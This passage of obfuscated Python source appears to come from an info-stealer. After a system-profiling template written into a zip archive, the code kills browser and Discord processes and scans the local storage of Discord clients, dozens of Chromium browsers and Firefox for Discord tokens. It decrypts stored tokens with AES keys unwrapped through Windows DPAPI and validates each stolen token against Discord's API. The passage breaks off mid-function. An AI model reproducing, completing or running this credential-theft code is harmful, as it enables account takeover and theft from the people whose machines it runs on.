 - Bios Version              : {DWDETHGVBTKWWWEVNJFMLGKBHRULVBEKQCBXYWTHRUBPGNVMYAVRLINLNRYRQRHORLSZIKVBBUCZKARDE}
 - System Bios Version       : {PNZQADOZCZLGIEPEIZXADMFQZNSPGUQQXEWRODDXBHLNZSEQQLSYBWIOFFBFVT}
 - System Version            : {NXCWFCBDXPOLQOPJVDFIYKADDMTPFGIEQEYICKWYFHTAPCCBQVNPGPOOIOIX}
 - System Family             : {QKWWLLKJPPMOAOMKSALIJHIMURDFUOYLWNASOYJVHTQAAJRYXLWAMPVGOXFPEBMYWQWITFYASEWSEYYD}
 - System Manufacturer       : {TLJWZNCNAHQBGKAREATYEDKMUZRJCAHSWDJLYIETAYHRZWYUSMFQNRYMXOKXFGCBJHTRETEU}
 - System Product            : {CNQUEAJOGNZWNGJSUTQBUALVHWSYFQVDMXEGQRAMLURFAEAJHEHBTBOQHGJHJRZVFLWIUZGCB}
 - System SKU                : {MZKUJWVOPZEVSXSJIZSCQQRTMIZQHCJSEFKSYBOQETEEHZGMFYKGCCFTM}
 - Oem String Serial Number  : {TSDCRBZNFMBDSZFYTHHGCTDMBWPAKQZWZKKUMWUDNLUAZFHYNBQMOGXAOEPWLKZIGTCUCUHPXJGOIROFQEKVYHUUSKI}
 - Asset Tag Serial Number   : {GJBBHOJBJWJZUVITTWOYLBMGBOORMUXVEZWZUVENIXJWXFFDYVNDCMHVLTMKIXPPAQPOOKOOJOG}

Ip:
 - Public : {WSFEMIYEDDWKNKEMUNMJAAGIYYUUUFJFKYDHUUZUVSCOCBACHAHUHNNPHOJATVCURXAGIOSLVXIEMIGSTNJZ}
 - Local  : {TCBOYUETIOAULXLNLRCLAOVPCVNVWRCLCCMRWMYJAITANVIINDHHCX}

Ip Information:
 - Isp : {HHNJUZOULUPPAHPPMMTMOHYRBQFGXFIFHNFERYSHBNQQUFCFAJYX}
 - Org : {SZEFFQNXUTHPYIOVSCCVUPMEKUMVYBMWZVMXCPWBGMDCFZXDPWVVAQXHRIREPAPHOXSCHOM}
 - As  : {XCHWNTLXGFLHVJYNJKYHCZIZROSLXZOSMLOFNEIAYLLQJFLBBBVJXUQYNNURLJ}

Ip Location:
 - Country   : {QXECGXUEXFUDAUKZMNBPWDDAJZUESSVHHPTYCDDRKRTKJTCGRXQBFZPVATD} ({QXECGXUEXFUDAUKZMNBPWDDAJZUESSVHHPTYCDDRKRTKJTCGRXQBFZPVATD_code})
 - Region    : {ULKZEJHUAESCKIYAMZQDZBEBMPVBYKLYUOBMBDOQWIBVXVMLUTFOFEKCMFEZNQHQ} ({ULKZEJHUAESCKIYAMZQDZBEBMPVBYKLYUOBMBDOQWIBVXVMLUTFOFEKCMFEZNQHQ_code})
 - Zip       : {HQNICBEASQBBZVOFREHVSISZQATAHBJDWBGXSOGCAVLMBDXLOJDF}
 - City      : {MZSRJOINJQVCTYWNHANGHKQBVCWWVOVSYJPDAJAPOOUKNZPOVADOIIWUSGCULKOKOJFJKVZLPFGDBGYJDZQHLTWQFQ}
 - Timezone  : {SIUMPEWAFVBXIADEKXBYXLJFUVKXNRGYPQRBGDWVOHOLOOHQZK}
 - Longitude : {UKUACAFVDJEARTWELIROTTXEXYUVDESXSXYDWFBHFCNZVYDLHUJKHCUVMDEJOEPZIMEXMNRUCTUMNZMROIIWHDMDEKDGNHF}
 - Latitude  : {HAEPSABBSGBNTLAKHVSQJJMERTZHDFRONRCTJHCIHUIFFYHXYXIJTMQANNKUBJEKWZAEFE}
"""
    SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr("System Info.txt", XYHTNOBMKCQIXVAWMKKWRLCMCEAFVXCCWXLDCGGYPITWGFAUGTTIGQDELCXOPKHZLLWDVWWWVKBHNTCHZDT)

    return BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info

def CCNBLRSYNBSEQNUKLYLJALPBNSYGYRHQCNTGNVTMOTIHYCNORNWYKGHQQXKDAUBXLBJDSIALCOGODKHNF(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    UZUNNQOCSMPFLYOPIPRIYDDHOVHQTUNSUILADFRGRYFYIPFVDLVRZYISNBCGMSMEO = ""
    HYSOZZZBKJRHQMKYBOZLJYVOGLVHMZGKETLUBBEIUXHUBUHGXZJOEFIDAI = 0

    def OSZRBGNTKXKWLGDZPSLSYJFNWZNDRDHPFFDYIEAXYQTZPYBJXQRKLSHBHCTCNWFHUMTMRMOHOKTHF():  
        TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL = "https://discord.com/api/v9/users/@me"
        KZGRBPXYBEVFAPUEMGTRRXNPWCHFQYSHESAXPBMPYMLCTJWURKRBQUWMDFCCKKBIJGMMDWAMDFUZZUOKUFVWEJLBMYIBBUZDRVYE = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        KZGRBPXYBEVFAPUEMGTRRXNPWCHFQYSHESAXPBMPYMLCTJWURKRBQUWMDFCCKKBIJGMMDWAMDFUZZUOKUFVWEJLBMYIBBUZDRVYE_enc = r"dQw4w9WgXcQ:[^\"]*"
        HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC = []
        NOHJQTZDIGISBRTHUNHQWULMNPBTYZUHRDHOTABVUTCZNQDSTYZ = []
        NAEWFGELMQEYZMWHCEPQLVSVWLTLSRHIFRNTBYFQPGALOOOPLZ = {}

        TRIWLRLBBDXRWXCILNTDLPWLKGFBUYQHUZTSFRGTABONGFYOCFXBSUYXHDAKPAEUPVDQKCTTBXUSZWHKRQE = [
            ("Discord",                os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex Tech",            os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserTech", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
            ("Yandex SxS",             os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserSxS", "User Data", "Default", "Local Storage", "leveldb"),       "yandex.exe"),
            ("Brave",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),   "brave.exe"),
            ("Iridium",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Iridium", "User Data", "Default", "Local Storage", "leveldb"),                          "iridium.exe"),
        ]

        
        try:
             for KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_proc_name in TRIWLRLBBDXRWXCILNTDLPWLKGFBUYQHUZTSFRGTABONGFYOCFXBSUYXHDAKPAEUPVDQKCTTBXUSZWHKRQE:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.name().lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except: pass
        except: pass

        for KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_proc_name in TRIWLRLBBDXRWXCILNTDLPWLKGFBUYQHUZTSFRGTABONGFYOCFXBSUYXHDAKPAEUPVDQKCTTBXUSZWHKRQE:
            if not os.path.exists(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):

                continue
            VYHTSWMYPLWUTRJZZSMODICRNIUWHOUYFZYWDQSBUMFBHBPYSBTPPGZITPXDNQCQGRYSOB = KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN.replace(" ", "").lower()
            if "cord" in GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT:
                if not os.path.exists(os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, VYHTSWMYPLWUTRJZZSMODICRNIUWHOUYFZYWDQSBUMFBHBPYSBTPPGZITPXDNQCQGRYSOB, 'Local State')):
                    continue
                for v4r_file_name in os.listdir(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM = os.path.join(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_file_name)
                    if os.path.exists(HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM):
                        with open(HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for y in re.findall(KZGRBPXYBEVFAPUEMGTRRXNPWCHFQYSHESAXPBMPYMLCTJWURKRBQUWMDFCCKKBIJGMMDWAMDFUZZUOKUFVWEJLBMYIBBUZDRVYE_enc, v4r_line.strip()):
                                    MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ = QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBBVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), IBCBBJGNOHAQGCRXHSJANIUCGBFORXMVWCWAXDUPDDBZHHHEWYZAKZBDLSBAWVKJTVUUPKWKGRBBJOATPDJUMALUOCJXQN(os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, VYHTSWMYPLWUTRJZZSMODICRNIUWHOUYFZYWDQSBUMFBHBPYSBTPPGZITPXDNQCQGRYSOB, 'Local State')))
                                    if XDQNICFMZHYSIYJFVLXPMFQFFSBETZHGTAJBNTWYCPQXVIVTSZ(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ, TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL):
                                        WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER = requests.get(TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL, headers={'Authorization': MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ}).json()['id']
                                        if WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER not in NOHJQTZDIGISBRTHUNHQWULMNPBTYZUHRDHOTABVUTCZNQDSTYZ:
                                            HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC.append(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ)
                                            NOHJQTZDIGISBRTHUNHQWULMNPBTYZUHRDHOTABVUTCZNQDSTYZ.append(WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER)
                                            NAEWFGELMQEYZMWHCEPQLVSVWLTLSRHIFRNTBYFQPGALOOOPLZ[MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ] = (KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM)
            else:
                for v4r_file_name in os.listdir(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM = os.path.join(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_file_name)
                    if os.path.exists(HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM):
                        with open(HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM, errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ in re.findall(KZGRBPXYBEVFAPUEMGTRRXNPWCHFQYSHESAXPBMPYMLCTJWURKRBQUWMDFCCKKBIJGMMDWAMDFUZZUOKUFVWEJLBMYIBBUZDRVYE, v4r_line.strip()):
                                    if XDQNICFMZHYSIYJFVLXPMFQFFSBETZHGTAJBNTWYCPQXVIVTSZ(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ, TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL):
                                        WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER = requests.get(TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL, headers={'Authorization': MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ}).json()['id']
                                        if WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER not in NOHJQTZDIGISBRTHUNHQWULMNPBTYZUHRDHOTABVUTCZNQDSTYZ:
                                            HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC.append(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ)
                                            NOHJQTZDIGISBRTHUNHQWULMNPBTYZUHRDHOTABVUTCZNQDSTYZ.append(WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER)
                                            NAEWFGELMQEYZMWHCEPQLVSVWLTLSRHIFRNTBYFQPGALOOOPLZ[MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ] = (KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, HDLLJMXDEXPZJUDFSNFLLYDKWFNTREUEEPAQOGCEVDLSRUOCTXGXCLOOTFRFLUFQDMXXAIDM)

        if os.path.exists(os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Mozilla", "Firefox", "Profiles")):
            for GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, _, v4r_files in os.walk(os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Mozilla", "Firefox", "Profiles")):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(os.path.join(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r__file), errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ in re.findall(KZGRBPXYBEVFAPUEMGTRRXNPWCHFQYSHESAXPBMPYMLCTJWURKRBQUWMDFCCKKBIJGMMDWAMDFUZZUOKUFVWEJLBMYIBBUZDRVYE, v4r_line.strip()):
                                    if XDQNICFMZHYSIYJFVLXPMFQFFSBETZHGTAJBNTWYCPQXVIVTSZ(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ, TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL):
                                        WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER = requests.get(TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL, headers={'Authorization': MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ}).json()['id']
                                        if WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER not in NOHJQTZDIGISBRTHUNHQWULMNPBTYZUHRDHOTABVUTCZNQDSTYZ:
                                            HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC.append(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ)
                                            NOHJQTZDIGISBRTHUNHQWULMNPBTYZUHRDHOTABVUTCZNQDSTYZ.append(WGCOWFODLKSUIIFZNUHCQFJDKERKSEQPSUQRNSMVKTGFSQWEFWCDAMVQAZXEVHMER)
                                            NAEWFGELMQEYZMWHCEPQLVSVWLTLSRHIFRNTBYFQPGALOOOPLZ[MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ] = ('Firefox', os.path.join(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r__file))
        return HXYGVIYZAEHFSWWJMUQKMACYBHBRUHILPKTTNTUYCMUKBLQZCHZMRWTIPHLVSEDYPLBFFQBCHOKNKPLWJZAPESRIUFFMKRPC, NAEWFGELMQEYZMWHCEPQLVSVWLTLSRHIFRNTBYFQPGALOOOPLZ

    def XDQNICFMZHYSIYJFVLXPMFQFFSBETZHGTAJBNTWYCPQXVIVTSZ(MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ, TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL):
        return requests.get(TAQQMIGGEMSOGWOURAVZZKTTMQHUKSGKPTUYIXUKBLWFYMDVOTMXBLQTGXCNDNTEFBZL, headers={'Authorization': MLMAFOUJIKFMUVFDJZXFXFOJFRQUTSKTPHOXGMENZEMQIAXSXSFUJ}).status_code == 200

    def QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBBVal(LKSQMGLLTEDBUSNCQOBMXLWPWVEBAGBNGOSTEQEKEGFAVZJONX, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP):
        MTMTNXLEJTSAEYTGUMLPNTXISSYEHIQZXWIONKLZFVUGLUDUEN = LKSQMGLLTEDBUSNCQOBMXLWPWVEBAGBNGOSTEQEKEGFAVZJONX[3:15]
        XQDCNKZRDXFOPQDOHWYGZXWKSIETGAWBDCYNVXXBDMTCQPAIZHRULQGPRBQJVJCRGZHHXNAEUMVLWAGAJWSYESKEO = LKSQMGLLTEDBUSNCQOBMXLWPWVEBAGBNGOSTEQEKEGFAVZJONX[15:]
        KRAUAOEMMBIZCLYJADWOUXVJGGLAUVYJIGFRYWWWXSMSXYAXTAJCTSFJSDAJDPO = AES.new(HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP, AES.MODE_GCM, MTMTNXLEJTSAEYTGUMLPNTXISSYEHIQZXWIONKLZFVUGLUDUEN)
        return KRAUAOEMMBIZCLYJADWOUXVJGGLAUVYJIGFRYWWWXSMSXYAXTAJCTSFJSDAJDPO.decrypt(XQDCNKZRDXFOPQDOHWYGZXWKSIETGAWBDCYNVXXBDMTCQPAIZHRULQGPRBQJVJCRGZHHXNAEUMVLWAGAJWSYESKEO)[:-16].decode()

    def IBCBBJGNOHAQGCRXHSJANIUCGBFORXMVWCWAXDUPDDBZHHHEWYZAKZBDLSBAWVKJTVUUPKWKGRBBJOATPDJUMALUOCJXQN(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
        if not os.path.exists(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
            return None
        with open(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, "r", encoding="utf-8") as v4r_f:
